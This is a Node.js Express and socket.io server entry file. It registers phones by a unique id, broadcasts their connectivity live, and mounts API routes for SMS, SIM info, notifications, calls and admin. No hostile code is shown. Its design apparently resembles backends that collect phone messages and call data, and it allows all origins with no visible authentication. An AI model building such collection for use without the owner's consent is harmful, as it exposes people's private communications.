import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  socket.on("registerDevice", (uniqueid) => {
    console.log(`📱 Registered Device: ${uniqueid}`);
    socket.join(uniqueid);
  });

  socket.on("deviceStatus", (data) => {
    console.log(`⚡ ${data.uniqueid} → ${data.connectivity}`);

    io.emit("deviceStatus", {
      uniqueid: data.uniqueid,
      connectivity: data.connectivity,
      updatedAt: new Date(),
    });
  });

  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected:", socket.id);
  });
});

// ✅ Test Route
app.get("/", (req, res) => {
  res.send("Hello my brother — Devices API with Live Socket is running fine! ⚡");
});

// ✅ Routes
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/sim", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);

app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
app.use((err, req, res, next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
